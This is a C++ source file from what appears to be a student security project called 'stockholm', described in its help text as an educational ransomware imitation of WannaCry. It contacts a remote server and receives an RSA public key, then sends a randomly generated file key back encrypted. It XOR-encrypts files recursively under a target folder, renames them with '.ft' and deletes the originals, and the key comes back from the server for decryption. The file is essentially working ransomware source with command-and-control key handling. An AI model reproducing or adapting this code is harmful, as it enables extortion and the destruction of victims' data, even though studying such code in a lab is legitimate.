/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   Stockholm.class.cpp                                :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: xxxxxxx <xxxxxxx@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/09/14 13:52:01 by xxxxxxx           #+#    #+#             */
/*   Updated: 2023/09/14 14:36:42 by xxxxxxx          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "../incs/Stockholm.class.hpp"

Stockholm::Stockholm(void): _path(std::filesystem::current_path() / "infected")
{
	this->_help = false;
	this->_version = false;
	this->_silent = false;
	this->_reverse = false;
}

Stockholm::~Stockholm(void)
{}

void	Stockholm::setHelp(bool help)
{
	this->_help = help;
}

void	Stockholm::setVersion(bool version)
{
	this->_version = version;
}

void	Stockholm::setSilent(bool silent)
{
	this->_silent = silent;
}

void	Stockholm::setReverse(bool reverse)
{
	this->_reverse = reverse;
}

void	Stockholm::setKey(std::string key)
{
	this->_key = key;
}

void Stockholm::generate_random_cipher(std::string& plain_cipher) {
	static const std::string charset =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789";

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(0, charset.size() - 1);

    plain_cipher.clear();
    for (size_t i = 0; i < CIPHER_SIZE; ++i) {
        plain_cipher += charset[dis(gen)];
    }
}

// We need to avoid cipher to be visible so we will encrypt it with the public key we received
int Stockholm::rsa_encrypt(EVP_PKEY* public_key, const std::string& plain_cipher, std::vector<unsigned char>& out) {
	size_t out_len;

    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(public_key, nullptr);
    if (!ctx) {
        return -1;
    }
    if (EVP_PKEY_encrypt_init(ctx) <= 0) {
        goto fail;
    }
    if (EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0) {
        goto fail;
    }
    if (EVP_PKEY_encrypt( // Size query
        ctx,
        nullptr,
        &out_len,
        reinterpret_cast<const unsigned char*>(plain_cipher.data()),
        plain_cipher.size()
    ) <= 0) {
        goto fail;
    }

    out.resize(out_len);
    if (EVP_PKEY_encrypt(
        ctx,
        out.data(),
        &out_len,
        reinterpret_cast<const unsigned char*>(plain_cipher.data()),
        plain_cipher.size()
    ) <= 0) {
        goto fail;
    }

    EVP_PKEY_CTX_free(ctx);
    return 0;

    fail:
        EVP_PKEY_CTX_free(ctx);
        return -1;
}

int Stockholm::init(std::string ip, int port) {
	memset(&server_addr_, 0, sizeof(server_addr_));
	server_addr_.sin_family = AF_INET;
	server_addr_.sin_port = htons(port);
	if (inet_pton(AF_INET, ip.c_str(), &server_addr_.sin_addr) <= 0) {
		std::cerr << "Invalid address" << std::endl;
		return -1;
	}

	sockfd_ = -1;
	return 0;
}

int Stockholm::runc() {
	ssize_t rc;
	CommandCode cmd = NONE;
	CommandCode ack = ACK;
	int error = 0;
	socklen_t error_len = sizeof(error);
	bool run = true;
	long pubkey_len = 0;
	long total_received = 0;
	std::string pubkey_data;
	BIO* bio = nullptr;
	EVP_PKEY* public_key = nullptr;
	std::string plain_cipher;
	std::vector<unsigned char> encrypted_cipher;

	while (run) {
		sockfd_ = socket(AF_INET, SOCK_STREAM, 0);
		if (sockfd_ < 0) {
			std::cerr << "Failed to create socket" << std::endl;
			goto retry;
		}

		if (connect(sockfd_, (struct sockaddr*)&server_addr_, sizeof(server_addr_)) < 0) {
			if (errno == ECONNREFUSED || errno == ETIMEDOUT) {
				std::cerr << "Trying to connect to the server" << std::endl;
				goto retry;
			} else {
				std::cerr << "Connection failed: " << strerror(errno) << std::endl;
				return -1;
			}
		}

		if (getsockopt(sockfd_, SOL_SOCKET, SO_ERROR, &error, &error_len) < 0) {
			std::cerr << "Connection verification failed: " << strerror(error) << std::endl;
			goto retry;
		}

		std::cout << "Connected to server " << inet_ntoa(server_addr_.sin_addr) << ":" << ntohs(server_addr_.sin_port) << std::endl;

		// Receive the command code and acknowledge it
		while (true) {
			rc = recv(sockfd_, &cmd, sizeof(cmd), 0);
			if (rc < 0) {
				std::cerr << "Error receiving data: " << strerror(errno) << std::endl;
				break;
			} else if (rc == 0) {
				std::cerr << "Client disconnected" << std::endl;
				goto retry;
			}

			if (cmd == CMD_CIPHER || cmd == CMD_DECIPHER) {
				send(sockfd_, &ack, sizeof(ack), 0);
				break;
			}
		}

		if (cmd == CMD_CIPHER) {
			while (true) {
				ssize_t rc = recv(sockfd_, &pubkey_len, sizeof(pubkey_len), 0);
				if (rc < 0) {
					std::cerr << "Error receiving data: " << strerror(errno) << std::endl;
					break;
				} else if (rc == 0) {
					std::cerr << "Client disconnected" << std::endl;
					goto retry;
				}
				if (pubkey_len > 0) {
					send(sockfd_, &ack, sizeof(ack), 0);
					break;
				}
			}

			pubkey_data.resize(pubkey_len, '\0');
			while (total_received < pubkey_len) {
				ssize_t rc = recv(sockfd_, &pubkey_data[total_received], pubkey_len - total_received, 0);
				if (rc < 0) {
					std::cerr << "Error receiving data: " << strerror(errno) << std::endl;
					break;
				} else if (rc == 0) {
					std::cerr << "Client disconnected" << std::endl;
					goto retry;
				}
				total_received += rc;
			}

			send(sockfd_, &ack, sizeof(ack), 0);
			bio = BIO_new_mem_buf(pubkey_data.data(), pubkey_len);
			if (!bio) {
				std::cerr << "Failed to create BIO" << std::endl;
				goto retry;
			}
			public_key = PEM_read_bio_PUBKEY(bio, nullptr, nullptr, nullptr);
			BIO_free(bio);

			if (!public_key) {
				std::cerr << "Failed to read public key" << std::endl;
				goto retry;
			}

			// Generate a random cipher and encrypt files with it then send it to the server
			generate_random_cipher(plain_cipher);
			std::cout << "Generated cipher: " << plain_cipher << std::endl;

			if (rsa_encrypt(public_key, plain_cipher, encrypted_cipher) < 0) {
				std::cerr << "Failed to encrypt cipher" << std::endl;
				EVP_PKEY_free(public_key);
				goto retry;
			}

			// Send the encrypted cipher to the server
			ssize_t send_len = encrypted_cipher.size();
			ssize_t rc;
			rc = send(sockfd_, &send_len, sizeof(send_len), 0);
			rc = send(sockfd_, encrypted_cipher.data(), encrypted_cipher.size(), 0);

			// Encrypt the files with the plain cipher
			this->_key = plain_cipher;
			_cipher(this->_path);

		} else if (cmd == CMD_DECIPHER) {
			char buffer[CIPHER_SIZE + 1];
			rc = recv(sockfd_, buffer, CIPHER_SIZE, 0);
			if (rc < 0) {
				std::cerr << "Error receiving data: " << strerror(errno) << std::endl;
				break;
			} else if (rc == 0) {
				std::cerr << "Client disconnected" << std::endl;
				goto retry;
			}
			buffer[rc] = '\0';
			std::cout << "Received cipher: " << buffer << std::endl;
			this->_key = buffer;
			_decipher(this->_path);
			close(sockfd_);
		}

		retry:
			if (run) {
				sleep(1);
				if (sockfd_ >= 0) {
					close(sockfd_);
				}
				run = false;
				continue;
			}
	}
	return 0;
}

void	Stockholm::run(void)
{
	if (this->_help)
		this->_printHelp();
	else if (this->_version)
		this->_printVersion();
	else if (this->_reverse)
		this->_decipher(this->_path);
	else
		this->_cipher(this->_path);
}

void	Stockholm::_printHelp(void)
{
	std::cout << "Usage:" << std::endl;
	std::cout << "\t./stockholm [-hv]" << std::endl;
	std::cout << "\t./stockholm [-s] [-r] [-r key]" << std::endl;
	std::cout << std::endl;
	std::cout << "Description:" << std::endl;
	std::cout << "\tstockholm is a 42 project that mimic the encyption of files, inspired by Wannacry but limited to the \"~/infection/\" folder. This project is for educational purposes only. You should never use the type of program for malicious purposes." << std::endl;
	std::cout << std::endl;
	std::cout << "Options:" << std::endl;
	std::cout << "\t-h\t\tPrint this help message and exit" << std::endl;
	std::cout << "\t-v\t\tPrint the version and exit" << std::endl;
	std::cout << "\t-s\t\tSilent mode" << std::endl;
	std::cout << "\t-r\t\tReverse mode, use the key to decrypt the files" << std::endl;
	std::cout << std::endl;
}

void	Stockholm::_printVersion(void)
{
	std::cout << "stockholm v" << VERSION << std::endl;
}

void	Stockholm::_decipher(std::filesystem::path path)
{
	if (!std::filesystem::exists(path) || !std::filesystem::is_directory(path))
	{
		std::cout << "Error while decyphering: path " << path << " does not exist" << std::endl;
		return ;
	}
	for (const auto & entry : std::filesystem::directory_iterator(path))
	{
		if (std::filesystem::is_symlink(entry.path())) {
			continue;
		}

		if (std::filesystem::is_directory(entry.path()))
		{
			this->_decipher(entry.path());
		}
		else
			this->_decipherFile(entry.path());
	}
}

void	Stockholm::_decipherFile(std::filesystem::path path)
{
	//check if the file path extension is in the _extensions vector
	if (path.extension() != ".ft")
		return ;

	//check if the file is a simlink
	if (std::filesystem::is_symlink(path))
		return ;
		
	//cipher the file
	try {
		if (access(path.c_str(), R_OK) == -1)
			return ;

		auto new_path = path;
		new_path.replace_extension("");

		int fd_old = open(path.c_str(), O_RDONLY);
		int fd_new = open(new_path.c_str(), O_WRONLY | O_CREAT, std::filesystem::status(path).permissions());

		if (fd_old == -1 || fd_new == -1)
		{
			// std::cout << "Error while opening file " << path << std::endl;
			return ;
		}

		char *buffer = new char[1024];
		bzero(buffer, 1024);
		int ret = 0;
		int	key_index = 0;
		while ((ret = read(fd_old, buffer, 1024)) > 0)
		{
			for (int i = 0; i < ret; i++)
			{
				buffer[i] ^= this->_key[key_index];
				key_index = (key_index + 1) % this->_key.length();
			}
			write(fd_new, buffer, ret);
		}
		close(fd_old);
		close(fd_new);
		remove(path.c_str());
		if (!this->_silent)
			std::cout << "Deciphering file " << path << std::endl;
	} catch(...) {
		return ;
	}
}


void	Stockholm::_cipher(std::filesystem::path path)
{
	if (!std::filesystem::exists(path) || !std::filesystem::is_directory(path))
	{
		std::cout << "Error while cyphering: path " << path << " does not exist" << std::endl;
		return ;
	}
	for (const auto & entry : std::filesystem::directory_iterator(path))
	{
		//check if path is a symlink
		if (std::filesystem::is_symlink(entry.path())) {
			continue;
		}	

		if (std::filesystem::is_directory(entry.path()))
		{
			this->_cipher(entry.path());
		}
		else
			this->_cipherFile(entry.path());
	}
}

void	Stockholm::_cipherFile(std::filesystem::path path)
{
	//check if the file path extension is in the _extensions vector
	if (std::find(this->_extensions.begin(), this->_extensions.end(), path.extension()) == this->_extensions.end())
		return ;
	
	//check if the file is a simlink
	if (std::filesystem::is_symlink(path))
		return ;
	
	//cipher the file
	try {
		if (access(path.c_str(), R_OK) == -1)
			return ;
		auto new_path = path;
		new_path.replace_extension(path.extension().string() + ".ft");

		int fd_old = open(path.c_str(), O_RDONLY);
		int fd_new = open(new_path.c_str(), O_WRONLY | O_CREAT, std::filesystem::status(path).permissions());

		if (fd_old == -1 || fd_new == -1)
		{
			// std::cout << "Error while opening file " << path << std::endl;
			return ;
		}

		char *buffer = new char[1024];
		bzero(buffer, 1024);
		int ret = 0;
		int	key_index = 0;
		while ((ret = read(fd_old, buffer, 1024)) > 0)
		{
			for (int i = 0; i < ret; i++)
			{
				buffer[i] ^= this->_key[key_index];
				key_index = (key_index + 1) % this->_key.length();
			}
			write(fd_new, buffer, ret);
		}
		close(fd_old);
		close(fd_new);
		remove(path.c_str());

		if (!this->_silent)
			std::cout << "Ciphering file " << path << std::endl;
	} catch(...) {
		return ;
	}
}